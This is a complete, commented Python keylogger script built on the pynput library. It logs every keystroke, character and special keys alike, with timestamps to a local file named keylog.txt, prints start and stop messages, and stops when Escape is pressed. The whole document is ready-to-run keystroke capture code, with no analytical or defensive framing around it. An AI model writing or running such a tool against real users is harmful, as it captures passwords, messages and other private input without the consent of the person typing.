from pynput import keyboard
import logging
from datetime import datetime

# --- Configuration ---
# Set up the log file to store the keystrokes
LOG_FILE = "keylog.txt"
# Set the logging format to include the date/time and the key pressed
logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# This function is called every time a key is pressed
def on_press(key):
    try:
        # Log regular character keys (like 'a', '1', '*')
        logging.info(f'{key.char}')
    except AttributeError:
        # Log special keys (like space, enter, shift, ctrl)
        # This makes the log more readable
        special_key = str(key).replace('Key.', '')
        logging.info(f'[{special_key}]')
        # Optional: Stop the keylogger by pressing 'esc'
        if key == keyboard.Key.esc:
            print("\n[!] Escape key pressed. Stopping keylogger...")
            return False # Stop listener

# This function is called when a key is released (optional, but good for clean exit)
def on_release(key):
    # You could also stop here, but stopping on press is simpler
    pass

# --- Main Execution ---
print("[*] Keylogger started. Logging keystrokes to", LOG_FILE)
print("[*] Press 'ESC' to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print("[*] Keylogger stopped.")